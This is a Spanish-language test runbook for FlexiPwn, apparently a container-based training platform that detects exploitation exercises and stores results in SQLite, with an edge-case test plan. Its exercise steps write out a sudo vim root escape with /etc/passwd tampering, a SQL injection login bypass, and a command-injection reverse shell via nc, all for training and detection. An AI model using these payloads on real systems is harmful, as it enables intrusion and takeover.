# Runbook de pruebas — Semana 13

Guía operativa para validar FlexiPwn end-to-end **desde un entorno limpio**,
viendo cada paso intermedio del flujo. Cubre las tres tareas pendientes:

1. **E2E por categoría** — cadena completa `YAML → exploit → TargetResult en DB`
   para `privesc`, `sqli` y `cmdinj`.
2. **Hacer trampa (tcpdump)** — una consulta SQL enviada *por fuera* del flujo
   normal del escenario igual se detecta.
3. **Casos borde** — contenedor caído mid-run, YAML malformado, participante
   duplicado, colisión de `env_id`, daemon detenido mid-run.

Todo se apoya en el **modo verboso (DEBUG)** introducido para esta validación.

---

## 0. Modelo mental (qué pasa por debajo)

```
Capa 1 (provider)         Capa 2 (monitores)        Capa 3 (motor)            Capa 4 (DB + daemon)
─────────────────         ──────────────────        ──────────────            ────────────────────
provider.create()   ──▶   Monitor._poll()     ──▶   engine.process_event ──▶  RunEvent (cada evento)
 red + contenedores        emite MonitorEvent         evaluator.matches()       TargetResult.matched
 + sniffer + baseline      vía on_event              propaga and/or/not        ExerciseRun.progress
```

Cada flecha es un **punto observable**. El runbook recorre las cuatro y dice
qué comando o tabla mirar en cada una.

---

## 1. Preparar un entorno limpio

Un entorno limpio = sin DB, sin daemon, sin contenedores residuales.

```bash
# 1. Detener daemon si está corriendo
flexipwn daemon stop || true

# 2. Borrar contenedores/redes/volúmenes residuales de FlexiPwn (rootless)
docker ps -aq --filter "label=flexipwn.managed=true" | xargs -r docker rm -f
docker network ls -q --filter "label=flexipwn.managed=true" | xargs -r docker network rm
rm -rf /tmp/flexipwn-volumes/*

# 3. Empezar con DB vacía (respaldando la anterior por las dudas)
mv ~/.flexipwn/flexipwn.db ~/.flexipwn/flexipwn.db.bak 2>/dev/null || true

# 4. Verificar que las imágenes estén construidas
./setup-images.sh            # construye flexipwn/* si faltan
docker images | grep flexipwn
```

> Si prefieres no borrar la DB, también puedes usar `FLEXIPWN_DB_PATH` para
> apuntar a una base de pruebas: `export FLEXIPWN_DB_PATH=/tmp/flexipwn-test.db`.

---

## 2. Activar el modo verboso (DEBUG)

El logging de FlexiPwn está silenciado por defecto (nivel `WARNING`). El modo
verboso lo sube a `DEBUG` y expone el flujo de las cuatro capas. Hay tres formas
de activarlo, según qué proceso quieras instrumentar:

| Quieres ver…                                    | Cómo activarlo                                  |
|-------------------------------------------------|-------------------------------------------------|
| `provider.create()` (creación del entorno)      | `flexipwn --verbose run start …` (corre en el CLI) |
| El daemon: eventos, matches, escrituras a DB    | `flexipwn daemon start --detach --verbose`      |
| Cualquier proceso, sin tocar el comando         | `export FLEXIPWN_LOG=DEBUG`                      |

Precedencia: `--verbose` > `FLEXIPWN_LOG` > `WARNING`. Lo más cómodo para una
sesión de pruebas completa:

```bash
export FLEXIPWN_LOG=DEBUG     # afecta a CLI y daemon por igual
```

**Qué imprime cada capa en DEBUG** (logger `flexipwn.*`, a stderr; en `--detach`
queda en `~/.flexipwn/daemon.log`):

```
create: env_id=… image=… network_capture=True filter='port 3306'   ← Capa 1
create: redes creadas interna=… externa=…
create: contenedor vulnerable '…-vulnerable' iniciado
create: contenedor atacante '…-attacker' conectado a red interna
create: baseline (healthcheck) con 12 entradas para …
create: sniffer tcpdump iniciado (filtro='port 3306')
event_sink[env]: network/network_payload details={"data":"SELECT…   ← Capa 2→4
engine[env]: hoja #3 (network_payload) matcheó con evento network/…  ← Capa 3
engine_update[env]: progreso=66% completed=False                     ← Capa 4
```

> El daemon corre en un proceso aparte; si lo arrancaste **sin** `--verbose` ni
> `FLEXIPWN_LOG`, sus logs DEBUG no aparecen aunque el CLI sí los muestre.
> Reinícialo con el flag.

---

## 3. Tarea 1 — E2E por categoría

Objetivo: ver **cada objeto que nace** (Scenario, Participant, ExerciseRun,
contenedores, TargetResult, RunEvent) y confirmar que el exploit real termina
escribiendo `targetresult.matched = 1` en SQLite.

### 3.1. Pasos comunes (una vez)

```bash
flexipwn daemon start --detach --verbose
flexipwn scenario load scenarios/privesc-demo.yaml
flexipwn scenario load scenarios/sqli-mysql-demo.yaml
flexipwn scenario load scenarios/command-injection-demo.yaml
flexipwn participant add           # autogenera "student-xxxxxx" + password
flexipwn scenario list             # ← objeto Scenario visible
flexipwn participant list          # ← objeto Participant visible (toma el username)
```

### 3.2. Recorrido por escenario (repetir para los 3)

Reemplaza `<SC>` por el título y `<U>` por el username.

```bash
flexipwn --verbose run start --scenario "<SC>" --participant "<U>"
# ↑ En el CLI verás los logs DEBUG de provider.create (Capa 1).
# Toma nota del env_id y de las credenciales SSH que imprime.
```

Tabla de breakpoints — qué observar en cada etapa:

| # | Etapa | Comando para verlo | Qué confirma |
|---|-------|--------------------|--------------|
| 1 | Entorno creado | `docker ps --filter label=flexipwn.env_id=<env>` | Contenedores `-vulnerable`, `-attacker` (y `-sniffer` en sqli) |
| 2 | Run + targets en DB | `flexipwn run show <env>` | `ExerciseRun` en `running`; N targets en `pendiente` |
| 3 | DB cruda | ver sección 6 (consultas SQLite) | Fila en `exerciserun`; N filas en `targetresult` con `matched=0` |
| 4 | Daemon registró el run | `flexipwn daemon logs --tail 30` | `_handle_running`, SSH listo, engine + monitores armados |
| 5 | **Stream en vivo** | `flexipwn run watch <env>` | Cada `MonitorEvent` a medida que ocurre (deja abierta esta terminal) |

Ahora ejecuta el **exploit canónico** del escenario (ver `hints:` del YAML):

- **privesc** — SSH al vulnerable desde el atacante, `sudo -l`, `sudo vim` →
  `:!/bin/bash` → shell root, luego `echo ok > /root/proof.txt` y modificar
  `/etc/passwd`. Targets: `file_created`, `file_modified`, `process_running`.
- **sqli** — desde el atacante, `curl` al login en `:5001` con
  `admin' OR '1'='1' #`. Targets: 3 × `log_pattern` (general.log de MySQL) +
  3 × `network_payload` (tcpdump en 3306).
- **cmdinj** — `nc -lvp 4444` en el atacante; `curl` al endpoint
  `/ping?host=;nc …attacker 4444 -e /bin/bash`. Targets: `network_connection`
  (puerto 4444) + `file_created`.

Mientras corre, observa la propagación:

| # | Etapa | Comando | Qué confirma |
|---|-------|---------|--------------|
| 6 | Evento emitido | terminal de `run watch` | aparece el `MonitorEvent` (fs/proc/log/network) |
| 7 | Match del engine | `daemon logs` (DEBUG) | `engine[env]: hoja #k … matcheó` |
| 8 | Persistencia | `flexipwn run progress <env>` | el target pasa a ✓ |
| 9 | DB cruda | ver sección 6 | `targetresult.matched=1`, `matched_at` poblado |
| 10 | Completado | `flexipwn run show <env>` | estado `completed` + **tiempos por etapa** |

Al completar (`condition: all`), el daemon destruye el entorno y registra el
hito en el feed:

```bash
flexipwn run show <env>     # tiempos: total, al primer objetivo, Δ por etapa
flexipwn daemon attach      # dentro del REPL: `dashboard` y `feed`
```

**Criterio de éxito (Tarea 1):** para los tres escenarios, los N targets quedan
`matched=1` en `targetresult`, el `exerciserun` queda `completed`, y la cadena
`MonitorEvent → engine match → DB` fue visible en cada paso.

---

## 4. Tarea 2 — Hacer trampa (tcpdump)

**Tesis a validar:** la detección es *independiente del camino*. El sniffer
corre con `network_mode=container:<vulnerable>` (comparte el netns del
vulnerable) y `tcpdump -i any port 3306`, así que **cualquier** tráfico TCP a
3306 se captura, lo haya generado la app web o no. Además el escenario sqli
tiene detección **redundante**: `general.log` de MySQL (`log_pattern`) +
captura de red (`network_payload`).

### 4.1. El experimento

Inicia el escenario sqli y, en vez de usar el formulario web, manda el SQL
directo al puerto 3306 **del contenedor vulnerable**.

```bash
flexipwn --verbose run start --scenario "SQL injection login bypass" --participant "<U>"
# anota el env_id (p.ej. run-085774ad)

# Opción A (recomendada) — camino del estudiante: SSH al atacante y luego nc.
flexipwn run show <env>          # toma host/puerto/usuario/clave SSH
ssh <user>@<host> -p <port>      # entra al atacante
printf 'SELECT * FROM users WHERE 1=1 OR 1=1' | nc -w3 flexipwn-<env>-vulnerable 3306

# Opción B — atajo de educador (solo si apuntas tu docker al contexto rootless
# que usa FlexiPwn, p.ej. con `docker context use …` o DOCKER_HOST):
docker exec flexipwn-<env>-attacker \
  sh -c "printf 'SELECT * FROM users WHERE 1=1 OR 1=1' | nc -w3 flexipwn-<env>-vulnerable 3306"
```

Verifica que los targets de red igual se marcan, **sin haber tocado la app**
(espera ~2-4 s al poll del daemon):

```bash
flexipwn run watch <env>     # debe aparecer un evento network/network_payload
flexipwn run progress <env>  # targets #4 (SELECT users) y #5 (OR 1=1) → ✓
cat /tmp/flexipwn-volumes/<env>/capture/traffic.txt   # bytes crudos capturados por tcpdump
```

> ✅ **Resultado validado (26/06/2026).** Desde el atacante, MySQL respondió
> `Host '…-attacker…' is not allowed to connect to this MySQL server`: es decir
> **rechazó la conexión y la query nunca se ejecutó**, pero los bytes del SELECT
> ya habían viajado por TCP al 3306 y tcpdump los capturó. Los targets #4 y #5
> pasaron a ✓ sin tocar la app web. Confirma la detección *path-independent* y
> deja claro un matiz clave: el detector de red matchea el **patrón en el
> tráfico**, no la ejecución exitosa (igual que una regla SIEM/SIGMA). El
> escenario no se completa (`condition: all`): quedan pendientes los 3
> `log_pattern` (requieren el flujo por la app) y el target #6 (la flag en la
> respuesta, que aquí no existió porque MySQL rechazó la conexión y no se consultó tampoco por la tabla de datos sensible).


---

## 5. Tarea 3 — Casos borde

Para cada caso: comportamiento esperado (según el código), cómo inducirlo y qué
observar. Documenta el resultado real junto a cada uno.

### 5.1. Contenedor caído mid-run

Con un run en `running`, detén el contenedor a mitad: `docker stop flexipwn-<env>-vulnerable`.

- **Esperado:** el `_poll()` de Process/Filesystem detecta el contenedor detenido → `on_stopped` → `ExerciseRun.status = "stopped"`.
- **Observar:** `flexipwn daemon logs` (`contenedor detenido`) y `flexipwn run show <env>` (estado `stopped`).
- **Unit test:** `test_layer2_process` y `test_layer2_filesystem` cubren `on_stopped` ante contenedor ausente o caído.

### 5.2. YAML malformado

Carga un YAML inválido (`environment` ausente, `target` sin `type`, `condition` no permitida): `flexipwn scenario validate /tmp/roto.yaml`, luego `scenario load`.

- **Esperado:** rechazo limpio con `ValidationError` de Pydantic, sin crash ni fila parcial en `scenario`.
- **Observar:** mensaje de error del comando; `flexipwn scenario list` no muestra el escenario roto.
- **Unit test:** `test_layer3_engine` cubre el rechazo del schema (level inválido, targets vacíos, `file_created` sin path); el mensaje amable de la CLI no está cubierto.

### 5.3. Participante duplicado

`participant add` autogenera el username, así que el duplicado se prueba a nivel DB: insertar otra fila `participant` con un username ya existente.

- **Esperado:** `username` es `unique=True` → la segunda inserción levanta `IntegrityError`, sin fila duplicada.
- **Observar:** error de la inserción; `flexipwn participant list` mantiene una sola fila para ese username.
- **Unit test:** `test_db.py::TestParticipantCRUD::test_username_unique` (asierta `IntegrityError`).

### 5.4. Colisión de `env_id`

`provider.create()` genera `env_id` aleatorio (`run-` + 8 hex; colisión natural ≈ imposible); se fuerza creando dos runs con el mismo `env_id`.

- **Esperado:** `env_id` es `unique=True` → la segunda inserción levanta `IntegrityError`, sin run duplicado.
- **Observar:** error de la inserción; un solo `exerciserun` con ese `env_id`.
- **Unit test:** `test_db.py::TestEnvIdUnique` (a nivel de modelo y vía `repository.create_run`).

### 5.5. Daemon detenido mid-run

Con un run en `running`, `flexipwn daemon stop` y luego `flexipwn daemon start --detach`.

- **Esperado:** `daemon stop` apaga el `SuperMonitor` pero preserva los contenedores y la DB queda `running`; al reiniciar, `_reconcile` reatacha el run o lo marca `failed` si el contenedor ya no existe.
- **Observar:** `flexipwn daemon logs` tras el reinicio (reconciliación o `marcando como failed`); `flexipwn run show <env>`.
- **Unit test:** `test_daemon_loop.py::test_reconcile_marks_failed_when_container_missing`.

---

## 6. Apéndice — Inspeccionar SQLite directo

La DB vive en `~/.flexipwn/flexipwn.db` (o `FLEXIPWN_DB_PATH`). Tablas: `scenario`,
`participant`, `exerciserun`, `targetresult`, `runevent`.

```bash
DB=~/.flexipwn/flexipwn.db

# Escenarios y participantes cargados
sqlite3 -header -column "$DB" "SELECT title, category, image FROM scenario;"
sqlite3 -header -column "$DB" "SELECT username, created_at FROM participant;"

# Estado de un run y sus targets
sqlite3 -header -column "$DB" \
  "SELECT env_id, status, progress FROM exerciserun ORDER BY created_at DESC LIMIT 5;"
sqlite3 -header -column "$DB" \
  "SELECT target_index, target_type, matched, matched_at, description
   FROM targetresult WHERE run_id=(SELECT id FROM exerciserun WHERE env_id='<env>')
   ORDER BY target_index;"

# Stream histórico de eventos (lo mismo que 'run watch', pero crudo)
sqlite3 -header -column "$DB" \
  "SELECT timestamp, monitor_type, event_type FROM runevent
   WHERE run_id=(SELECT id FROM exerciserun WHERE env_id='<env>')
   ORDER BY timestamp;"
```
